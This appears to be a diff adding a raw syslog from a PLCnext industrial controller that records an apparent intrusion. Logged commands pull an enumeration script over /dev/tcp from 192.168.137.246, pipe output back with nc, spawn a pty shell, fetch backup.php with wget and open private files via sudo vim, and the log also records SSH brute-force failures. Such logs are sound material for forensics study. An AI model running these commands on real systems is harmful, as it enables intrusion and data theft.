@@ -1,0 +1,1171 @@
+Aug 24 22:00:42 axcf2152 bash[4635]: CMD: stty raw -echo | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:00:47 axcf2152 bash[4700]: CMD: export SHELL=bash | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:00:52 axcf2152 bash[4706]: CMD: export TERM=xterm | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:00:57 axcf2152 bash[4772]: CMD: stty rows 24 columns 80 | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:01:07 axcf2152 bash[4926]: CMD: export TERM=xterm256-color | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:01:57 axcf2152 bash[5181]: CMD: export TERM=xterm256-color | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:02:16 axcf2152 bash[5398]: CMD: export TERM=xterm256-color | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:02:35 axcf2152 bash[5531]: CMD: export TERM=xterm256-color | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:02:40 axcf2152 bash[5540]: CMD: stty raw -echo | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:02:44 axcf2152 bash[5605]: CMD: export SHELL=bash | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:02:51 axcf2152 bash[5611]: CMD: export TERM=xterm | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:02:57 axcf2152 bash[5677]: CMD: stty rows 24 columns 80 | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:03:39 axcf2152 bash[6023]: CMD: ls | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:03:49 axcf2152 bash[6089]: CMD: cat < /dev/tcp/192.168.137.246/80 > linpease.sh | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:04:23 axcf2152 bash[6366]: CMD: cat < /dev/tcp/192.168.137.246/80 > linpease.sh | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:05:06 axcf2152 bash[6701]: CMD: nc 192.168.137.246 9002 < linpease | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:06:08 axcf2152 bash[7160]: CMD: cat < /dev/tcp/192.168.137.246/80 > linpease.sh | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:06:31 axcf2152 bash[7293]: CMD: cat < /dev/tcp/192.168.137.246/80 > linpease.sh | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:08:16 axcf2152 bash[8082]: CMD: cd .. | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:08:18 axcf2152 bash[8142]: CMD: ls -la | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:08:23 axcf2152 bash[8161]: CMD: cd .. | USER: admin | CWD: /opt/plcnext
+Aug 24 22:08:25 axcf2152 bash[8168]: CMD: ls -la | USER: admin | CWD: /opt/plcnext
+Aug 24 22:08:33 axcf2152 bash[8233]: CMD: cd master | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:08:45 axcf2152 bash[8299]: CMD: cat < /dev/tcp/192.168.137.246/80 > linpease.sh | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:10:29 axcf2152 bash[9116]: CMD: cat < /dev/tcp/192.168.137.246/80 > linpease.sh | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:10:32 axcf2152 bash[9122]: CMD: cd .. | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:11:02 axcf2152 root: [2024-08-24 22:11:02] Script Accessed: /opt/plcnext/master/php_app | Owner: admin | Group: root | Size: 4096 bytes | Last Modified: 2024-08-24 22:10:29.330000000 +0000
+Aug 24 22:11:02 axcf2152 root: [2024-08-24 22:11:02] Script Accessed: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:11:22 axcf2152 bash[9526]: CMD: cd php_app | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:12:02 axcf2152 root: [2024-08-24 22:12:02] Script Accessed: /opt/plcnext/master/php_app | Owner: admin | Group: root | Size: 4096 bytes | Last Modified: 2024-08-24 22:11:26.390000000 +0000
+Aug 24 22:12:02 axcf2152 root: [2024-08-24 22:12:02] Script Accessed: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 34454 bytes | Last Modified: 2024-08-24 22:11:37.110000000 +0000
+Aug 24 22:12:02 axcf2152 root: [2024-08-24 22:12:02] Script Accessed: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:12:03 axcf2152 root: [2024-08-24 22:12:03] Script executed: PID=9535, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:13:02 axcf2152 root: [2024-08-24 22:13:01] Script Modified: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 64233 bytes | Last Modified: 2024-08-24 22:12:56.370000000 +0000
+Aug 24 22:13:02 axcf2152 root: [2024-08-24 22:13:02] Script executed: PID=9535, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:13:02 axcf2152 root: [2024-08-24 22:13:02] Script executed: PID=14441, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:14:02 axcf2152 root: [2024-08-24 22:14:02] Script Modified: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 283788 bytes | Last Modified: 2024-08-24 22:13:57.740000000 +0000
+Aug 24 22:14:03 axcf2152 root: [2024-08-24 22:14:02] Script Modified: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:14:03 axcf2152 root: [2024-08-24 22:14:03] Script executed: PID=9535, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:14:03 axcf2152 root: [2024-08-24 22:14:03] Script executed: PID=15771, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:15:02 axcf2152 root: [2024-08-24 22:15:02] Script Modified: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 285918 bytes | Last Modified: 2024-08-24 22:14:59.270000000 +0000
+Aug 24 22:15:02 axcf2152 root: [2024-08-24 22:15:02] Script Modified: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:15:03 axcf2152 root: [2024-08-24 22:15:02] Script executed: PID=9535, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:16:02 axcf2152 root: [2024-08-24 22:16:02] Script Modified: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 289586 bytes | Last Modified: 2024-08-24 22:16:02.290000000 +0000
+Aug 24 22:16:03 axcf2152 root: [2024-08-24 22:16:03] Script executed: PID=9535, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:16:03 axcf2152 root: [2024-08-24 22:16:03] Script executed: PID=29001, Command=sh, User=, Args=sh linpease.sh
+Aug 24 22:17:02 axcf2152 root: [2024-08-24 22:17:02] Script Modified: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 357940 bytes | Last Modified: 2024-08-24 22:17:02.080000000 +0000
+Aug 24 22:17:03 axcf2152 root: [2024-08-24 22:17:03] Script executed: PID=9535, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:18:02 axcf2152 root: [2024-08-24 22:18:02] Script Modified: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 394355 bytes | Last Modified: 2024-08-24 22:18:02.300000000 +0000
+Aug 24 22:18:02 axcf2152 root: [2024-08-24 22:18:02] Script Modified: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:18:03 axcf2152 root: [2024-08-24 22:18:02] Script executed: PID=1620, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:18:04 axcf2152 root: [2024-08-24 22:18:04] Script executed: PID=9535, Command=sh, User=admin, Args=sh linpease.sh
+Aug 24 22:19:02 axcf2152 root: [2024-08-24 22:19:02] Script Modified: /opt/plcnext/master/php_app/linpease | Owner: admin | Group: plcnext | Size: 433057 bytes | Last Modified: 2024-08-24 22:18:58.410000000 +0000
+Aug 24 22:19:02 axcf2152 root: [2024-08-24 22:19:02] Script Modified: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:20:02 axcf2152 root: [2024-08-24 22:20:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:20:33 axcf2152 bash[7189]: CMD: nc -lvnp 9002 > linpease_out | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:21:02 axcf2152 root: [2024-08-24 22:21:01] Script Accessed: /opt/plcnext/master/php_app | Owner: admin | Group: root | Size: 4096 bytes | Last Modified: 2024-08-24 22:20:33.360000000 +0000
+Aug 24 22:21:02 axcf2152 root: [2024-08-24 22:21:02] Script Accessed: /opt/plcnext/master/php_app/linpease_out | Owner: admin | Group: plcnext | Size: 0 bytes | Last Modified: 2024-08-24 22:20:33.360000000 +0000
+Aug 24 22:21:02 axcf2152 root: [2024-08-24 22:21:02] Script Accessed: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:22:02 axcf2152 root: [2024-08-24 22:22:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:22:29 axcf2152 bash[8077]: CMD: nc -lvnp 9002 > linpease_out | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:22:41 axcf2152 bash[8143]: CMD: ls | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:22:49 axcf2152 bash[8209]: CMD: ls -la | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:23:01 axcf2152 root: [2024-08-24 22:23:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:23:19 axcf2152 bash[8492]: CMD: nc -q 5 -lvnp 80 < linpease | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:24:02 axcf2152 root: [2024-08-24 22:24:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:24:08 axcf2152 bash[8842]: CMD: nc -q 5 -lvnp 80 < linpeas.sh | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:24:27 axcf2152 bash[8976]: CMD: nc -q 5 -lvnp 80 < linpease | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:25:02 axcf2152 root: [2024-08-24 22:25:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:26:01 axcf2152 root: [2024-08-24 22:26:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:26:05 axcf2152 bash[9711]: CMD: pwd | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:27:02 axcf2152 root: [2024-08-24 22:27:02] Script Accessed: /opt/plcnext/master/php_app | Owner: admin | Group: root | Size: 4096 bytes | Last Modified: 2024-08-24 22:26:07.820000000 +0000
+Aug 24 22:27:02 axcf2152 root: [2024-08-24 22:27:02] Script Accessed: /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:29:02 axcf2152 root: [2024-08-24 22:29:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:28:02 axcf2152 root: [2024-08-24 22:28:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:30:02 axcf2152 root: [2024-08-24 22:30:01] Script : /opt/plcnext/master/php_
+app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:31:02 axcf2152 root: [2024-08-24 22:31:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:32:02 axcf2152 root: [2024-08-24 22:32:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:33:01 axcf2152 root: [2024-08-24 22:33:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:34:02 axcf2152 root: [2024-08-24 22:34:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:35:02 axcf2152 root: [2024-08-24 22:35:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:36:02 axcf2152 root: [2024-08-24 22:36:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:37:02 axcf2152 root: [2024-08-24 22:37:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:38:02 axcf2152 root: [2024-08-24 22:38:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:39:01 axcf2152 bash[15641]: CMD: python3 -c 'import pty; pty.spawn("/bin/bash")' | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:39:02 axcf2152 root: [2024-08-24 22:39:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:41:02 axcf2152 root: [2024-08-24 22:41:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:42:02 axcf2152 root: [2024-08-24 22:42:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:43:01 axcf2152 root: [2024-08-24 22:43:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:45:01 axcf2152 root: [2024-08-24 22:45:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:46:02 axcf2152 root: [2024-08-24 22:46:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:47:02 axcf2152 root: [2024-08-24 22:47:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:48:02 axcf2152 root: [2024-08-24 22:48:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:49:02 axcf2152 root: [2024-08-24 22:49:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 23:00:01 axcf2152 root: [2024-08-24 23:00:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:59:02 axcf2152 root: [2024-08-24 22:59:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:58:02 axcf2152 root: [2024-08-24 22:58:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:57:02 axcf2152 root: [2024-08-24 22:57:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:56:01 axcf2152 root: [2024-08-24 22:56:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:54:02 axcf2152 root: [2024-08-24 22:54:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:50:03 axcf2152 root: [2024-08-24 22:50:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:51:02 axcf2152 root: [2024-08-24 22:51:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:52:02 axcf2152 root: [2024-08-24 22:52:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:53:02 axcf2152 root: [2024-08-24 22:53:01] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+Aug 24 22:55:02 axcf2152 root: [2024-08-24 22:55:02] Script : /opt/plcnext/master/php_app/linpease.sh | Owner: admin | Group: plcnext | Size: 862779 bytes | Last Modified: 2024-08-24 22:10:29.410000000 +0000
+
+Aug 24 22:26:07 axcf2152 bash[9777]: CMD: wget http://192.168.137.246/backup.php | USER: admin | CWD: /opt/plcnext/master/php_app
+Aug 24 22:27:02 axcf2152 root: [2024-08-24 22:27:02] Script Accessed: /opt/plcnext/master/php_app/backup.php | Owner: admin | Group: plcnext | Size: 1523 bytes | Last Modified: 2024-08-24 22:26:07.820000000 +0000
+Aug 24 22:28:56 axcf2152 bash[10956]: CMD: wget http://192.168.137.246/backup.php | USER: admin | CWD: /opt/plcnext/master/php_app
+
+Aug 24 22:48:03 axcf2152 CROND[19767]: pam_unix(crond:session): session closed for user root
+Aug 24 22:48:31 axcf2152 root: [2024-08-24 22:48:31] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:48:31 axcf2152 root: [2024-08-24 22:48:31] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 19281, Command: vim)
+Aug 24 22:30:11 axcf2152 sudo:    admin : TTY=pts/2 ; PWD=/opt/plcnext/master ; USER=root ; COMMAND=/usr/bin/vim private_file.txt
+Aug 24 22:30:25 axcf2152 root: [2024-08-24 22:30:25] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:30:25 axcf2152 root: [2024-08-24 22:30:25] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 11625, Command: vim)
+Aug 24 22:31:26 axcf2152 root: [2024-08-24 22:31:26] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:31:26 axcf2152 root: [2024-08-24 22:31:26] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 11625, Command: vim)
+Aug 24 22:32:26 axcf2152 root: [2024-08-24 22:32:26] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:32:26 axcf2152 root: [2024-08-24 22:32:26] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 11625, Command: vim)
+Aug 24 22:32:27 axcf2152 root: [2024-08-24 22:32:27] File /opt/plcnext/projects/Default/System/Um/.Users.config.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:32:27 axcf2152 root: [2024-08-24 22:32:27] File /opt/plcnext/projects/Default/System/Um/.Users.config.swp was accessed by user root (PID: 12260, Command: vim)
+Aug 24 22:33:28 axcf2152 root: [2024-08-24 22:33:28] File /opt/plcnext/master/.private_file.txt.swp was accessed by user USER (PID: PID, Command: COMMAND)
+Aug 24 22:33:28 axcf2152 root: [2024-08-24 22:33:28] File /opt/plcnext/master/.private_file.txt.swp was accessed by user root (PID: 11625, Command: vim)
+Aug 24 22:34:09 axcf2152 bash[13498]: CMD: sudo vim private_file.txt | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:34:10 axcf2152 bash[13524]: CMD: sudo vim private_file.txt | USER: admin | CWD: /opt/plcnext/master
+Aug 24 22:36:15 axcf2152 sshd[14380]: Received disconnect from 192.168.137.246 port 51140:11: Bye Bye [preauth]
+Aug 24 22:36:15 axcf2152 sshd[14380]: Disconnected from authenticating user engineer 192.168.137.246 port 51140 [preauth]
+Aug 24 22:36:17 axcf2152 sshd[14385]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:17 axcf2152 sshd[14383]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:17 axcf2152 sshd[14384]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:17 axcf2152 sshd[14382]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:19 axcf2152 sshd[14385]: Failed password for engineer from 192.168.137.246 port 51176 ssh2
+Aug 24 22:36:19 axcf2152 sshd[14383]: Failed password for engineer from 192.168.137.246 port 51150 ssh2
+Aug 24 22:36:19 axcf2152 sshd[14384]: Failed password for engineer from 192.168.137.246 port 51166 ssh2
+Aug 24 22:36:19 axcf2152 sshd[14382]: Failed password for engineer from 192.168.137.246 port 51148 ssh2
+Aug 24 22:36:20 axcf2152 sshd[14383]: Connection closed by authenticating user engineer 192.168.137.246 port 51150 [preauth]
+Aug 24 22:36:20 axcf2152 sshd[14384]: Connection closed by authenticating user engineer 192.168.137.246 port 51166 [preauth]
+Aug 24 22:36:21 axcf2152 sshd[14382]: Connection closed by authenticating user engineer 192.168.137.246 port 51148 [preauth]
+Aug 24 22:36:21 axcf2152 sshd[14385]: Connection closed by authenticating user engineer 192.168.137.246 port 51176 [preauth]
+Aug 24 22:36:24 axcf2152 sshd[14449]: Received disconnect from 192.168.137.246 port 51186:11: Bye Bye [preauth]
+Aug 24 22:36:24 axcf2152 sshd[14449]: Disconnected from authenticating user engineer 192.168.137.246 port 51186 [preauth]
+Aug 24 22:36:25 axcf2152 sshd[14453]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:25 axcf2152 sshd[14454]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:25 axcf2152 sshd[14451]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:25 axcf2152 sshd[14452]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:27 axcf2152 sshd[14453]: Failed password for engineer from 192.168.137.246 port 41546 ssh2
+Aug 24 22:36:27 axcf2152 sshd[14454]: Failed password for engineer from 192.168.137.246 port 41550 ssh2
+Aug 24 22:36:27 axcf2152 sshd[14451]: Failed password for engineer from 192.168.137.246 port 41538 ssh2
+Aug 24 22:36:27 axcf2152 sshd[14452]: Failed password for engineer from 192.168.137.246 port 41544 ssh2
+Aug 24 22:36:31 axcf2152 sshd[14453]: Failed password for engineer from 192.168.137.246 port 41546 ssh2
+Aug 24 22:36:31 axcf2152 sshd[14454]: Failed password for engineer from 192.168.137.246 port 41550 ssh2
+Aug 24 22:36:32 axcf2152 sshd[14451]: Failed password for engineer from 192.168.137.246 port 41538 ssh2
+Aug 24 22:36:32 axcf2152 sshd[14452]: Failed password for engineer from 192.168.137.246 port 41544 ssh2
+Aug 24 22:36:35 axcf2152 sshd[14453]: Failed password for engineer from 192.168.137.246 port 41546 ssh2
+Aug 24 22:36:35 axcf2152 sshd[14454]: Failed password for engineer from 192.168.137.246 port 41550 ssh2
+Aug 24 22:36:35 axcf2152 sshd[14451]: Failed password for engineer from 192.168.137.246 port 41538 ssh2
+Aug 24 22:36:35 axcf2152 sshd[14452]: Failed password for engineer from 192.168.137.246 port 41544 ssh2
+Aug 24 22:36:37 axcf2152 sshd[14453]: Failed password for engineer from 192.168.137.246 port 41546 ssh2
+Aug 24 22:36:37 axcf2152 sshd[14452]: Failed password for engineer from 192.168.137.246 port 41544 ssh2
+Aug 24 22:36:37 axcf2152 sshd[14451]: Failed password for engineer from 192.168.137.246 port 41538 ssh2
+Aug 24 22:36:37 axcf2152 sshd[14454]: Failed password for engineer from 192.168.137.246 port 41550 ssh2
+Aug 24 22:36:39 axcf2152 sshd[14453]: Failed password for engineer from 192.168.137.246 port 41546 ssh2
+Aug 24 22:36:39 axcf2152 sshd[14454]: Failed password for engineer from 192.168.137.246 port 41550 ssh2
+Aug 24 22:36:39 axcf2152 sshd[14452]: Failed password for engineer from 192.168.137.246 port 41544 ssh2
+Aug 24 22:36:39 axcf2152 sshd[14451]: Failed password for engineer from 192.168.137.246 port 41538 ssh2
+Aug 24 22:36:42 axcf2152 sshd[14452]: Failed password for engineer from 192.168.137.246 port 41544 ssh2
+Aug 24 22:36:42 axcf2152 sshd[14451]: Failed password for engineer from 192.168.137.246 port 41538 ssh2
+Aug 24 22:36:42 axcf2152 sshd[14454]: Failed password for engineer from 192.168.137.246 port 41550 ssh2
+Aug 24 22:36:42 axcf2152 sshd[14453]: Failed password for engineer from 192.168.137.246 port 41546 ssh2
+Aug 24 22:36:44 axcf2152 sshd[14454]: error: maximum authentication attempts exceeded for engineer from 192.168.137.246 port 41550 ssh2 [preauth]
+Aug 24 22:36:44 axcf2152 sshd[14454]: Disconnecting authenticating user engineer 192.168.137.246 port 41550: Too many authentication failures [preauth]
+Aug 24 22:36:44 axcf2152 sshd[14454]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:44 axcf2152 sshd[14454]: PAM service(sshd) ignoring max retries; 6 > 3
+Aug 24 22:36:44 axcf2152 sshd[14453]: error: maximum authentication attempts exceeded for engineer from 192.168.137.246 port 41546 ssh2 [preauth]
+Aug 24 22:36:44 axcf2152 sshd[14453]: Disconnecting authenticating user engineer 192.168.137.246 port 41546: Too many authentication failures [preauth]
+Aug 24 22:36:44 axcf2152 sshd[14453]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:44 axcf2152 sshd[14453]: PAM service(sshd) ignoring max retries; 6 > 3
+Aug 24 22:36:44 axcf2152 sshd[14452]: error: maximum authentication attempts exceeded for engineer from 192.168.137.246 port 41544 ssh2 [preauth]
+Aug 24 22:36:44 axcf2152 sshd[14452]: Disconnecting authenticating user engineer 192.168.137.246 port 41544: Too many authentication failures [preauth]
+Aug 24 22:36:44 axcf2152 sshd[14452]: PAM 5 more authentication failures; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.137.246  user=engineer
+Aug 24 22:36:44 axcf2152 sshd[14452]: PAM service(sshd) ignoring max retries; 6 > 3
+Aug 24 22:36:44 axcf2152 sshd[14451]: error: maximum authentication attempts exceeded for engineer from 192.168.137.246 port 41538 ssh2 [preauth]
